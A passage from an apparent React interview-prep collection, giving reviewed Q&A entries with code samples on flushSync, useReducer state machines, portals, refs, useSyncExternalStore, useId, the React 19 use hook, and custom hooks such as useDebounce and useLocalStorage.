It suppresses hydration mismatch warnings for attributes and text content on that specific element (one level deep), useful for timestamps and dates.

## Citations

- https://react.dev/reference/react-dom/client/hydrateRoot#handling-different-client-and-server-content
- https://nextjs.org/docs/messages/react-hydration-error

# How does the flushSync API force synchronous DOM updates, and in what specific use cases is it justified?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** `ReactDOM.flushSync` forces React to immediately flush any pending state updates and synchronously mutate the host DOM on the spot, bypassing React's standard asynchronous scheduling and automatic batching. It is justified almost exclusively in scenarios where an imperative API (like measuring DOM layout or focusing an element) requires immediate DOM updates within the exact same synchronous call stack.

```tsx
import { useState, useRef } from 'react';
import { flushSync } from 'react-dom';

function ChatMessageList() {
    const [messages, setMessages] = useState<string[]>([]);
    const listRef = useRef<HTMLDivElement>(null);

    const handleSendMessage = (text: string) => {
        // Force React to add message to DOM synchronously BEFORE measuring scroll:
        flushSync(() => {
            setMessages(prev => [...prev, text]);
        });
        // DOM is now guaranteed to have the new message rendered!
        if (listRef.current) {
            listRef.current.scrollTop = listRef.current.scrollHeight;
        }
    };

    return (
        <div ref={listRef} style={{ height: 300, overflowY: 'auto' }}>
            {messages.map((m, i) => <div key={i}>{m}</div>)}
        </div>
    );
}
```

**Complexity analysis and mechanics:**
- **Main thread blocking:** `flushSync` halts execution, immediately runs reconciliation for the affected subtree, and mutates the DOM synchronously.
- **De-optimization:** It defeats concurrent rendering and automatic batching for that update.

**Algorithmic mechanics and edge cases:**
If `flushSync` is called while another component's lifecycle is already flushing, React will emit a warning. Never wrap entire event handlers in `flushSync`; wrap only the minimal state setter whose resulting DOM changes must be measured immediately.

## Why

flushSync guarantees DOM nodes exist synchronously before executing layout calculations like scroll restoration or canvas drawing.

## Worked Case

Walkthrough scenario: A chat app appends a new message and immediately scrolls to list.scrollHeight. With standard setState, the scroll logic runs before React renders the new message DOM node, scrolling to the second-to-last message. Wrapping setMessages in flushSync forces the new message DOM node to mount immediately, ensuring list.scrollHeight accurately includes the new message.

## Risk

Overusing flushSync degrades animation performance and invalidates React 18 automatic batching and concurrent time-slicing.

## Trade-off

Guarantees synchronous DOM availability at the cost of blocking the JavaScript main thread during rendering.

## Try This

Attempt to scroll to the bottom of an auto-expanding chat log with and without flushSync and observe scroll position accuracy.

## Follow-ups

### Can flushSync be called inside an effect hook like useEffect?

No, flushSync should not be called inside lifecycle methods or effects where React is already managing a commit or passive phase; use it in user event handlers.

## Citations

- https://react.dev/reference/react-dom/flushSync
- https://react.dev/learn/manipulating-the-dom-with-refs#flushing-state-updates-synchronously-with-flush-sync

# How do state machines (e.g., using useReducer) eliminate impossible UI states compared to multiple boolean flags?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Managing asynchronous flows using multiple boolean flags (`isLoading`, `isError`, `isSuccess`, `isEmpty`) permits $2^n$ mathematical permutations of state, many of which represent **impossible UI states** (e.g. `isLoading=true` and `isSuccess=true` simultaneously, displaying both a loading spinner and success card). Finite State Machines (FSMs), implemented via `useReducer` or libraries like XState, restrict state to exactly one valid status at a time and define explicit valid transitions between states.

```tsx
import { useReducer } from 'react';

// Discriminated union of mutually exclusive states:
type FetchState =
    | { status: 'idle' }
    | { status: 'loading' }
    | { status: 'success'; data: string[] }
    | { status: 'error'; error: string };

type FetchAction =
    | { type: 'FETCH_START' }
    | { type: 'FETCH_SUCCESS'; payload: string[] }
    | { type: 'FETCH_ERROR'; error: string };

function fetchReducer(state: FetchState, action: FetchAction): FetchState {
    switch (state.status) {
        case 'idle':
        case 'error':
            if (action.type === 'FETCH_START') return { status: 'loading' };
            return state;
        case 'loading':
            if (action.type === 'FETCH_SUCCESS') return { status: 'success', data: action.payload };
            if (action.type === 'FETCH_ERROR') return { status: 'error', error: action.error };
            return state;
        case 'success':
            if (action.type === 'FETCH_START') return { status: 'loading' };
            return state;
    }
}
```

**Complexity analysis and mechanics:**
- **State space:** Reduces $2^4 = 16$ unconstrained boolean permutations down to 4 strictly defined states.
- **Determinism:** Reducer is a pure mathematical function `(state, action) => nextState` easily tested with unit assertions.

**Algorithmic mechanics and edge cases:**
State machines inherently prevent race conditions. If a delayed `FETCH_SUCCESS` action arrives while the state machine has already transitioned to `idle` or a new `loading` cycle, the reducer ignores the invalid action according to the state transition table.

## Why

State machines mathematically rule out contradictory UI states and guarantee deterministic state transitions.

## Worked Case

Walkthrough scenario: An authentication modal has isSubmitting and isError flags. A slow network request fails. isError is set to true, but the developer forgets to reset isSubmitting to false. The submit button remains permanently disabled with a spinner while showing an error message. Modeling as { status: 'idle' | 'submitting' | 'error' } makes it mathematically impossible for submitting and error to coexist.

## Risk

Scattering independent useState booleans across components leads to impossible states when developers forget to reset flags.

## Trade-off

Requires writing initial reducer and action type boilerplate compared to quick useState booleans.

## Try This

Refactor a form with 4 boolean flags into a useReducer state machine and verify that invalid transitions are rejected.

## Follow-ups

### What is the primary benefit of testing reducers compared to testing components directly?

Reducers are pure functions without DOM or hook dependencies; you can assert state transitions by simply passing state and action objects.

## Citations

- https://react.dev/learn/extracting-state-logic-into-a-reducer
- https://kentcdodds.com/blog/stop-using-isloading-booleans

# How do Portals render children into a different DOM subtree while preserving React event bubbling semantics?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** `ReactDOM.createPortal(children, domNode)` renders a component's DOM output into a different DOM node outside the parent component's DOM hierarchy (typically directly into `document.body` or a dedicated modal root). Crucially, even though the portal exists in a separate physical DOM location, it behaves like an ordinary React child in every other way: **React synthetic events bubble up through the React component tree**, not the physical HTML DOM tree.

```tsx
import { useState, ReactNode } from 'react';
import { createPortal } from 'react-dom';

function Modal({ children, onClose }: { children: ReactNode; onClose: () => void }) {
    const modalRoot = document.getElementById('modal-root') || document.body;
    return createPortal(
        <div className="modal-overlay" onClick={onClose}>
            {/* Clicking inside modal stops propagation to overlay */}
            <div className="modal-content" onClick={e => e.stopPropagation()}>
                {children}
            </div>
        </div>,
        modalRoot
    );
}

function ParentCard() {
    const [show, setShow] = useState(false);
    return (
        // Clicks inside the portal bubble to this parent div in the React tree!
        <div onClick={() => console.log('ParentCard clicked via React portal bubbling!')}>
            <button onClick={() => setShow(true)}>Open Modal</button>
            {show && <Modal onClose={() => setShow(false)}><p>Hello Portal</p></Modal>}
        </div>
    );
}
```

**Complexity analysis and mechanics:**
- **DOM detachment:** Bypasses CSS parent constraints (`overflow: hidden`, `z-index: 1`, `transform`) that clip fixed modals.
- **Synthetic event traversal:** React dispatches synthetic events by walking the Fiber `return` pointer chain, ensuring bubbling follows JSX nesting.

**Algorithmic mechanics and edge cases:**
Accessibility requires careful management when using portals. Because the DOM node is moved outside the parent, developers must implement explicit focus traps, manage `aria-modal="true"`, and return focus to the trigger element when the portal unmounts.

## Why

Portals solve CSS clipping and stacking context issues for modals and tooltips without breaking React component hierarchy.

## Worked Case

Walkthrough scenario: A card inside a scrolling container with overflow: hidden needs to display a floating action tooltip. Without portals, the tooltip is clipped by the container's boundaries. Using createPortal(tooltip, document.body) renders the tooltip at the document root with absolute positioning, completely avoiding container clipping while retaining parent prop bindings.

## Risk

Assuming events won't bubble to the parent component because the DOM node is physically located in document.body.

## Trade-off

Allows rendering outside CSS containers but requires explicit keyboard focus management for screen readers.

## Try This

Place an element with overflow:hidden, render a modal inside it without portals (clipped) vs with createPortal (unclipped).

## Follow-ups

### Do events originating from a portal propagate through physical DOM parent listeners?

No, native DOM event listeners on the physical parent of the portal target will not catch the event; only listeners along the React component tree catch synthetic bubbling.

## Citations

- https://react.dev/reference/react-dom/createPortal
- https://react.dev/learn/portals

# How do useState and useReducer differ in state transition guarantees, lazy initialization, and dispatch stability?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** `useState` and `useReducer` are React's primary state primitives, with `useReducer` actually serving as the foundational engine under the hood (`useState` is implemented internally using `useReducer`). While `useState` is ideal for simple, independent state cells, `useReducer` provides architectural guarantees for complex state objects with interdependent sub-properties and predictable transitions guided by state machine actions.

```typescript
// 1. Lazy initialization in useState vs useReducer
// Expensive computation runs ONLY on initial mount, not on every re-render:
const [state, setState] = useState(() => calculateExpensiveInitialState(props.seed));

// useReducer with init function to defer initial state creation:
function init(initialSeed: number) {
    return { count: initialSeed, history: [initialSeed] };
}
const [state, dispatch] = useReducer(reducer, props.seed, init);
```

**Mechanics and Dispatch Stability:**
- **Dispatch reference identity:** Both `setState` and `dispatch` identity are guaranteed to remain referentially stable across all re-renders for the lifetime of the component. You do not need to include `dispatch` or `setState` in `useEffect` or `useCallback` dependency arrays.
- **Functional updates in useState:** When next state depends on current state, passing an updater callback `setCount(prev => prev + 1)` prevents stale closure capture during concurrent batching.
- **Atomic transitions in useReducer:** In `useReducer`, action dispatches decouple the *what happened* (the action event) from *how the state updates* (the reducer function). When an action requires updating multiple related fields (e.g. `isLoading`, `error`, `data`), `useReducer` applies the update atomically in a single pass, eliminating intermediate inconsistent renders.

## Why

useReducer provides predictable state transitions and eliminates race conditions across complex interdependent fields.

## Worked Case

Walkthrough scenario: An async fetch uses three useState calls: setLoading, setData, and setError. Under rapid user toggling, a resolved fetch sets loading false and data, but an earlier errored request resolves late and sets error true. The UI renders both data and error simultaneously. Refactoring to useReducer with explicit actions (FETCH_INIT, FETCH_SUCCESS, FETCH_FAILURE) ensures loading, data, and error transitions are mutually exclusive and atomic.

## Risk

Mutating state directly inside a reducer function instead of returning fresh objects breaks reconciliation and memoization.

## Trade-off

useReducer introduces more boilerplate code and action ceremonies compared to inline useState setters.

## Try This

Convert three interdependent useState booleans into a useReducer state machine and verify impossible states are eliminated.

## Follow-ups

### What changes when you pass state and dispatch through React Context?

Separating state and dispatch into two distinct contexts prevents components that only need dispatch from re-rendering when state changes.

## Citations

- https://react.dev/reference/react/useState
- https://react.dev/reference/react/useReducer

# How do useRef and useImperativeHandle manage mutable escape hatches and imperative component handles?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** `useRef` returns a persistent, mutable container object whose `.current` property holds an arbitrary value that survives across all re-renders of a component. Unlike `useState`, mutating `ref.current` is a synchronous side-effect that does *not* notify React or trigger a re-render. `useImperativeHandle` works in tandem with `forwardRef` to customize and restrict the imperative methods exposed to parent components, preserving encapsulation.

```typescript
import { forwardRef, useImperativeHandle, useRef } from 'react';

export interface VideoPlayerHandle {
    play(): void;
    pause(): void;
    seekTo(seconds: number): void;
}

export const VideoPlayer = forwardRef<VideoPlayerHandle, { src: string }>((props, ref) => {
    const internalVideoRef = useRef<HTMLVideoElement>(null);

    // Restrict parent access to only play, pause, and seekTo instead of exposing full DOM node
    useImperativeHandle(ref, () => ({
        play() { internalVideoRef.current?.play(); },
        pause() { internalVideoRef.current?.pause(); },
        seekTo(sec) { if (internalVideoRef.current) internalVideoRef.current.currentTime = sec; }
    }), []);

    return <video ref={internalVideoRef} src={props.src} />;
});
```

**Core mechanics and usage boundaries:**
- **DOM measurement and focus:** Accessing actual HTML elements for focus management, scroll positioning, canvas manipulation, and third-party DOM libraries.
- **Instance variables:** Storing timer IDs (from `setTimeout`/`setInterval`), animation frame IDs, previous prop/state values, or abort controllers.
- **Golden rule:** Never read or write `ref.current` during rendering computation. Only mutate and read refs inside event handlers or `useEffect`/`useLayoutEffect`.

## Why

Refs provide an escape hatch for non-rendering values and imperative DOM operations without causing re-render loops.

## Worked Case

Walkthrough scenario: A parent form component needs to focus and highlight an invalid custom input inside a complex child widget upon submit. Exposing the raw input DOM node breaks abstraction and lets the parent mutate arbitrary attributes. Implementing useImperativeHandle exposes only a validateAndFocus imperative method. When the parent calls ref.current.validateAndFocus, the child triggers internal validation animations and focuses the native input cleanly.

## Risk

Reading or modifying ref.current during rendering introduces non-deterministic bugs in concurrent and strict mode.

## Trade-off

Imperative handles break purely declarative data flow and should be restricted to media, canvas, or focus behaviors.

## Try This

Wrap an input element in forwardRef with useImperativeHandle exposing only a focusAndSelectAll method, and invoke it from a parent.

## Follow-ups

### What happens if you read or write ref.current directly during the render phase?

Reading or writing refs during render makes component output unpredictable, as concurrent React can pause, discard, or re-execute render passes.

## Citations

- https://react.dev/reference/react/useRef
- https://react.dev/reference/react/useImperativeHandle

# How does useSyncExternalStore eliminate tearing in concurrent React and integrate external subscriptions safely?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** `useSyncExternalStore` was introduced in React 18 to solve 'tearing'—a visual inconsistency bug where different components on the screen read different values from an external mutable store during a single concurrent render pass. Because React 18 can yield execution in the middle of rendering a component tree, an external store mutation between time slices would cause already-rendered components to show old data while subsequently-rendered components show new data.

```typescript
import { useSyncExternalStore } from 'react';

// Custom hook subscribing to browser network online status:
function subscribe(callback: () => void) {
    window.addEventListener('online', callback);
    window.addEventListener('offline', callback);
    return () => {
        window.removeEventListener('online', callback);
        window.removeEventListener('offline', callback);
    };
}

function getSnapshot() {
    return navigator.onLine;
}

function getServerSnapshot() {
    return true; // Default true during SSR
}

export function useOnlineStatus() {
    return useSyncExternalStore(subscribe, getSnapshot, getServerSnapshot);
}
```

**Requirements and Invariants:**
- **Immutable snapshots:** The `getSnapshot` function must return an immutable value or referentially stable object if the underlying data has not changed. Returning a new object literal every time triggers an infinite re-render loop.
- **Synchronous checks:** React inspects the external store before and after concurrent renders; if a mismatch is detected, React discards the concurrent tree and synchronously re-renders the entire tree to guarantee consistency.

## Why

useSyncExternalStore coordinates non-React external stores with React concurrent scheduling without visual tearing.

## Worked Case

Walkthrough scenario: A financial trading dashboard renders 50 stock tickers using a global Redux store. During a non-urgent transition, React renders the first 25 tickers with price 100 USD. An incoming WebSocket message updates the store price to 105 USD. Traditional useEffect subscriptions would render tickers 26 to 50 at 105 USD while tickers 1 to 25 remain at 100 USD (tearing). useSyncExternalStore detects the snapshot change mid-render and forces a synchronized atomic re-render so all 50 tickers display 105 USD simultaneously.

## Risk

Returning a new object reference from getSnapshot on every invocation causes an infinite re-render loop.

## Trade-off

External store mutations force synchronous de-optimizations when conflicts arise during concurrent background rendering.

## Try This

Write a useWindowDimensions hook with useSyncExternalStore and verify resize events do not tear across sibling widgets.

## Follow-ups

### Why is useEffect and useState subscription insufficient for concurrent external state?

useEffect runs after the browser paint, meaning intermediate frames are visible with inconsistent state before the synchronization effect runs.

## Citations

- https://react.dev/reference/react/useSyncExternalStore
- https://github.com/reactwg/react-18/discussions/86

# How does the useId hook generate hydration-stable unique identifiers for accessible form controls?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** `useId` generates unique, deterministic, and hydration-stable identifiers formatted as `:r0:`, `:r1:`, etc. Prior to `useId`, developers relied on random numbers (`Math.random()`) or global counters (`id++`). Random numbers guarantee a hydration mismatch because server and client generate different random values. Global counters fail because server-rendered streams and asynchronous client component hydration arrive in non-deterministic orders.

```tsx
import { useId } from 'react';

export function AccessibleFormField({ label, hint }: { label: string; hint: string }) {
    const id = useId();
    const hintId = `${id}-hint`;

    return (
        <div className="field-group">
            <label htmlFor={id}>{label}</label>
            <input id={id} type="text" aria-describedby={hintId} />
            <p id={hintId} className="hint">{hint}</p>
        </div>
    );
}
```

**Underlying mechanics:**
- **Hierarchical tree position:** `useId` derives IDs from the position of the component in React's Fiber tree hierarchy. Because the tree structure is identical on the server and client, the generated IDs match perfectly across HTML generation and client hydration.
- **Prefixing for multiple elements:** A single `useId()` call per component can generate multiple related IDs by appending suffixes (e.g. `${id}-firstName`, `${id}-lastName`), saving Fiber memory.
- **Anti-pattern:** Never use `useId` to generate keys for mapping over arrays in list rendering. Keys must come from your data.

## Why

useId calculates deterministic identifiers based on component tree coordinates, eliminating SSR hydration mismatches.

## Worked Case

Walkthrough scenario: An accessible password input uses Math.random() to connect label htmlFor to input id. In server-rendered HTML, the input receives id='pwd-4821'. During client hydration, Math.random() produces 'pwd-9134'. React logs a hydration mismatch error, discards the server DOM node, and screen readers fail to associate the label with the input control until full client remounting. Switching to useId produces deterministic ':r1:' on both server and client, resolving the error instantly.

## Risk

Using useId to generate list reconciliation keys causes state corruption and remount thrashing on data reorders.

## Trade-off

IDs are opaque strings with colons (:r0:) and cannot be styled as simple CSS class names or target CSS selectors directly.

## Try This

Inspect server-rendered HTML and client DOM for a form with useId, verifying identical IDs across the boundary without console warnings.

## Follow-ups

### Can you use useId to generate CSS selectors?

useId generates tokens containing colons (:r0:), which require backslash escaping in querySelector but work natively in getElementById.

## Citations

- https://react.dev/reference/react/useId
- https://github.com/reactwg/react-18/discussions/111

# How do useDebugValue and custom DevTools formatting inspect internal hook state during development?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** `useDebugValue` is a developer-experience hook designed specifically for authoring custom hooks. It allows a custom hook to display custom, readable labels and diagnostics inside the React DevTools Component Inspector tab. In production builds, `useDebugValue` compiles away into a no-op, adding zero overhead to the production bundle.

```typescript
import { useState, useEffect, useDebugValue } from 'react';

export function useFriendStatus(friendId: string) {
    const [isOnline, setIsOnline] = useState<boolean | null>(null);

    // Simple string formatting:
    // useDebugValue(isOnline ? 'Online' : 'Offline');

    // Deferred formatting: formatter function is ONLY executed if React DevTools is actively open
    useDebugValue(isOnline, status => status === null ? 'Connecting...' : status ? 'Active (Online)' : 'Idle (Offline)');

    useEffect(() => {
        // Subscription logic...
    }, [friendId]);

    return isOnline;
}
```

**Key Best Practices:**
- **Only for shared custom hooks:** Do not add `useDebugValue` to every custom hook. Reserve it for complex, widely shared libraries (e.g. animation libraries, query caches, form frameworks).
- **Lazy formatting function:** Always pass a secondary formatting function `useDebugValue(date, d => d.toISOString())` when formatting is computationally expensive, ensuring it only executes when developer tools inspect the node.

## Why

useDebugValue surfaces internal custom hook diagnostics directly within React DevTools without littering console logs.

## Worked Case

Walkthrough scenario: A shared animation hook useSpring coordinates velocity and friction across hundreds of elements. Without useDebugValue, inspecting a component in React DevTools only displays three raw anonymous useState numbers. Adding useDebugValue with a deferred formatter displays 'Spring: { velocity: 12.4, target: 100, settled: false }', enabling immediate visualization of physics calculations without cluttering the browser console.

## Risk

Executing heavy synchronous formatting logic without the deferred function argument degrades developer experience in DevTools.

## Trade-off

Adds minor code footprint to custom hook definitions for developer-facing introspection only.

## Try This

Implement useDebugValue with a formatting function in a custom useDebounce hook and inspect the live timer status in React DevTools.

## Follow-ups

### Does useDebugValue execute or affect performance in production builds?

No, React strips out useDebugValue logic in production builds, ensuring zero runtime or memory overhead for end users.

## Citations

- https://react.dev/reference/react/useDebugValue

# How does the React 19 use hook unwrap promises and context conditionally inside loops and branching logic?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** The `use` hook (introduced in React 19) is a fundamentally unique React API that breaks the traditional 'Rules of Hooks' invariant. While all standard hooks (`useState`, `useEffect`, etc.) must be called unconditionally at the top level of a component, `use` can be called conditionally inside `if` statements, ternary operators, and loops. It can read both Promises and React Context values.

```tsx
import { use, Suspense } from 'react';

// 1. Reading Context conditionally:
function UserGreeting({ showFull, themeContext }: { showFull: boolean; themeContext: React.Context<Theme> }) {
    if (!showFull) {
        return <span>Welcome!</span>;
    }
    // Conditionally read context without breaking hook rules!
    const theme = use(themeContext);
    return <span style={{ color: theme.color }}>Welcome back, authenticated user!</span>;
}

// 2. Unwrapping Promises in streaming components:
function MessageFeed({ messagePromise }: { messagePromise: Promise<string[]> }) {
    // Suspends component until messagePromise resolves:
    const messages = use(messagePromise);
    return <ul>{messages.map((m, i) => <li key={i}>{m}</li>)}</ul>;
}
```

**Mechanics with Suspense and Error Boundaries:**
- When reading a Promise that is pending, `use` suspends the component, causing the nearest parent `<Suspense fallback={<Spinner />}>` to display.
- If the Promise rejects, `use` throws the rejection error, which is caught and displayed by the nearest `<ErrorBoundary>`.
- The Promise passed to `use` must be cached (e.g. via Next.js cache or a query client); creating a new Promise inside render causes an infinite suspension loop.

## Why

use enables asynchronous data streaming and conditional context reads directly inside JSX without render-prop gymnastics.

## Worked Case

Walkthrough scenario: An application dashboard renders an optional comments section only when a user toggles an accordion. Traditional useContext required lifting context or unconditionally subscribing to comments, triggering re-renders even when collapsed. With React 19 use, the component only calls use(CommentsContext) if isExpanded is true. When collapsed, the component incurs zero subscription overhead.

## Risk

Creating a new un-memoized Promise during render and passing it to use triggers an infinite suspension loop.

## Trade-off

Requires wrapping consumers in Suspense and Error Boundaries to handle pending and rejected promise states.

## Try This

Pass a fetch promise from a server action into a client component with use, rendering a skeleton fallback with Suspense.

## Follow-ups

### Can the use hook be invoked inside standard JavaScript helper functions?

No, like other hooks, use can only be called inside React component functions or custom hook functions, never in plain utility functions.

## Citations

- https://react.dev/reference/react/use

# How do you design and architect robust custom React hooks, and when should you return a tuple versus an object?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Custom hooks are JavaScript functions whose names begin with `use` and that compose built-in React hooks to encapsulate reusable, stateful business logic. Custom hooks share *stateful logic*, not physical state itself: each component instance calling a custom hook receives an isolated, independent state allocation. Choosing between returning a tuple `[state, actions]` versus an object `{ state, actions }` is a fundamental API design decision.

```typescript
// 1. Tuple Return (Convention like useState):
// Best for 1-2 elements where callers frequently rename values:
export function useToggle(initial = false): [boolean, () => void] {
    const [on, setOn] = useState(initial);
    const toggle = useCallback(() => setOn(v => !v), []);
    return [on, toggle];
}
// Usage allows clean renaming:
// const [isModalOpen, toggleModal] = useToggle();
// const [isNavOpen, toggleNav] = useToggle();

// 2. Object Return (Convention for complex hooks):
// Best for 3+ properties, optional destructuring, and future-proof extensibility:
export interface AsyncState<T> {
    data: T | null;
    isLoading: boolean;
    error: Error | null;
    refetch: () => Promise<void>;
}
```

**Key Architecture Invariants:**
- **Stable action references:** All action callbacks returned from a custom hook must be memoized with `useCallback` or functional updates to prevent breaking consumer `useEffect` dependencies.
- **Cleanups:** If the custom hook sets up subscriptions, intervals, or observers, it *must* return a cleanup function in `useEffect`.
- **Strict naming:** Prefix with `use` so React ESLint linters enforce top-level call order rules.

## Why

Custom hooks extract stateful coordination logic while guaranteeing encapsulation and independent lifecycle instances.

## Worked Case

Walkthrough scenario: A developer writes a useUser hook returning [user, loading, error, refetch, mutate]. Consuming components that only need mutate must write const [, , , , mutate] = useUser(), which is fragile and error-prone. Refactoring the return signature to an object { user, loading, error, refetch, mutate } allows clean destructuring: const { mutate } = useUser(), while allowing future properties (e.g. isStale) to be added without breaking existing callers.

## Risk

Returning un-memoized object or function references from custom hooks causes continuous re-render cascades in consuming components.

## Trade-off

Tuples offer frictionless renaming for 1-2 items; objects provide clear self-documenting property names and easy extensibility for 3+ items.

## Try This

Write a useToggle hook returning a tuple [boolean, () => void], and use it in two separate components verifying isolated state.

## Follow-ups

### How do you achieve TypeScript tuple types that do not widen to union arrays?

Use an explicit return type annotation like [boolean, () => void] or the as const assertion on the returned array.

## Citations

- https://react.dev/learn/reusing-logic-with-custom-hooks

# How do you implement a production-grade useDebounce and useThrottle custom hook with cleanup and immediate execution flags?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Debouncing and throttling limit the rate of expensive computations (e.g. API search queries, layout calculations, or window resize handlers). A production-grade `useDebounce` hook defers updating a value until a specified delay has elapsed since the last change, canceling any pending timers when new inputs arrive or when the component unmounts.

```typescript
import { useState, useEffect, useRef, useCallback } from 'react';

// 1. Debounced Value Hook (ideal for search inputs)
export function useDebounce<T>(value: T, delayMs: number): T {
    const [debouncedValue, setDebouncedValue] = useState<T>(value);

    useEffect(() => {
        const handler = setTimeout(() => {
            setDebouncedValue(value);
        }, delayMs);

        // Cleanup cancels timer if value or delay changes before delayMs elapsed
        return () => {
            clearTimeout(handler);
        };
    }, [value, delayMs]);

    return debouncedValue;
}

// 2. Throttled Callback Hook (ideal for scroll / resize events)
export function useThrottleCallback<T extends (...args: any[]) => void>(callback: T, limitMs: number): T {
    const lastRun = useRef<number>(0);
    const timer = useRef<ReturnType<typeof setTimeout> | null>(null);
    const savedCallback = useRef(callback);
    savedCallback.current = callback;

    return useCallback(((...args: any[]) => {
        const now = Date.now();
        if (now - lastRun.current >= limitMs) {
            lastRun.current = now;
            savedCallback.current(...args);
        }
    }) as T, [limitMs]);
}
```

**Memory and Lifecycle Invariants:**
- Always invoke `clearTimeout` in the `useEffect` cleanup function. Omitting cleanup triggers memory leaks and state updates on unmounted components.
- Using `useRef` to hold the latest callback (`savedCallback.current`) allows the throttled callback to read fresh state without re-creating the wrapper function on every render.

## Why

Rate-limiting hooks prevent API spam and main-thread layout thrashing during rapid user typing or scroll interactions.

## Worked Case

Walkthrough scenario: An auto-complete search bar fires an HTTP query on every keystroke. Typing 'react components' generates 16 rapid requests that arrive out-of-order, overwriting the final search results with stale responses. Integrating useDebounce(query, 300) buffers intermediate keystrokes and only fires a single HTTP request 300ms after the user pauses typing, completely eliminating race conditions.

## Risk

Failing to clear setTimeout in the cleanup return handler causes state updates on unmounted components.

## Trade-off

Debouncing introduces intentional visual delay (latency) in exchange for dramatic reductions in network and CPU load.

## Try This

Connect useDebounce to a text input wired to an external API fetch effect, verifying that typing 10 characters triggers only 1 HTTP request.

## Follow-ups

### How do you add a cancel or flush method to a debounced callback hook?

Attach cancel and flush functions to the returned function using Object.assign or a returned controller object with ref-held timer IDs.

## Citations

- https://react.dev/reference/react/useEffect#connecting-to-an-external-system

# How do you build a resilient useLocalStorage custom hook that syncs across multiple browser tabs via window storage events?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** A resilient `useLocalStorage` hook synchronizes component state with the browser's `window.localStorage` engine while providing three critical production capabilities: safe JSON serialization/deserialization with fallbacks, SSR safety when `window` is undefined, and cross-tab multi-window synchronization via the native `window` `'storage'` event.

```typescript
import { useState, useEffect, useCallback } from 'react';

export function useLocalStorage<T>(key: string, initialValue: T): [T, (value: T | ((prev: T) => T)) => void] {
    // 1. SSR-safe lazy initialization
    const [storedValue, setStoredValue] = useState<T>(() => {
        if (typeof window === 'undefined') return initialValue;
        try {
            const item = window.localStorage.getItem(key);
            return item ? (JSON.parse(item) as T) : initialValue;
        } catch (error) {
            console.warn(`Error reading localStorage key '${key}':`, error);
            return initialValue;
        }
    });

    // 2. Wrapped setter that writes to localStorage and component state
    const setValue = useCallback((value: T | ((prev: T) => T)) => {
        setStoredValue(prev => {
            const next = value instanceof Function ? value(prev) : value;
            if (typeof window !== 'undefined') {
                try {
                    window.localStorage.setItem(key, JSON.stringify(next));
                } catch (e) { console.error('LocalStorage quota exceeded', e); }
            }
            return next;
        });
    }, [key]);

    // 3. Cross-tab synchronization via window 'storage' event
    useEffect(() => {
        function handleStorageChange(e: StorageEvent) {
            if (e.key === key && e.newValue !== null) {
                try { setStoredValue(JSON.parse(e.newValue)); } catch {}
            }
        }
        window.addEventListener('storage', handleStorageChange);
        return () => window.removeEventListener('storage', handleStorageChange);
    }, [key]);

    return [storedValue, setValue];
}
```

**Crucial Caveat:** The native `'storage'` event only fires on *other* open tabs, not the tab that made the mutation. Updating local state in `setValue` handles the active tab, while the event listener syncs background tabs.

## Why

useLocalStorage bridges persistent client storage with reactive state while maintaining multi-tab cache consistency.

## Worked Case

Walkthrough scenario: A user opens an e-commerce dashboard in two adjacent browser tabs. In Tab 1, the user logs out, clearing authentication keys from localStorage. Without a storage event listener, Tab 2 continues rendering the active user session and allows sensitive actions until page refresh. Implementing useLocalStorage with a storage listener notifies Tab 2 immediately upon Tab 1's logout, resetting Tab 2 to the login screen automatically.

## Risk

Failing to handle quota errors or private-browsing restrictions causes unhandled runtime exceptions during setItem.

## Trade-off

Synchronous localStorage I/O can block the main thread if storing large multi-megabyte payloads.

## Try This

Open an application in two browser tabs and change a theme or cart item in tab A; verify tab B updates instantly via storage events.

## Follow-ups

### Why does window.addEventListener('storage') not trigger in the active tab that invoked setItem?

The HTML storage specification intentionally dispatches storage events only to other documents sharing the origin to prevent redundant local updates.

## Citations

- https://developer.mozilla.org/en-US/docs/Web/API/Window/storage_event
- https://react.dev/reference/react/useState

# How do you create a performant useIntersectionObserver custom hook for infinite scrolling and lazy asset loading?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** A custom `useIntersectionObserver` hook observes when a target DOM node enters or exits the browser viewport (or an ancestor container) using the browser's asynchronous `IntersectionObserver` API. This completely replaces expensive and laggy `window.onscroll` listeners with off-thread platform intersection checks.

```typescript
import { useState, useEffect, useRef } from 'react';

export interface IntersectionOptions extends IntersectionObserverInit {
    freezeOnceVisible?: boolean;
}

export function useIntersectionObserver(
    elementRef: React.RefObject<Element | null>,
    { threshold = 0, root = null, rootMargin = '0px', freezeOnceVisible = false }: IntersectionOptions = {}
): IntersectionObserverEntry | null {
